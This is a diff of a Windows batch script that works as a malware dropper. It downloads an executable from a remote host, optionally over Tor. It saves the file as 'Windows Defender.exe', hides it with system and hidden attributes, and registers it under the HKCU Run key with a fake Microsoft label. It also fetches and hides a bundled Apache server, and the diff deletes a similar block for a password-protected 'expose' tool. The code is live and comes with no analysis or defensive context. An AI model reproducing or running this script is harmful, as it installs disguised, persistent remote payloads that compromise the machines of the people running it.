@@ -34,14 +34,8 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 )
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" && REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
-
-attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe" (
-   attrib +s +h +i "%environment%\expose.exe"
-) else (
-  "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.7z -o "%temp%\expose.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.7z" -p7zexpose -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.7z"
-)
  
- attrib -s -h -i "C:\apache2" &&  if exist "C:\apache2\bin\httpd.exe" (
+ attrib -s -h -i "C:\apache2" && if exist "C:\apache2\bin\httpd.exe" (
     attrib +s +h +i "C:\apache2"
 ) else (
    "%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache -o"C:\" -y && attrib +s +h +i "C:\apache2" && del "%temp%\apache2.7z"
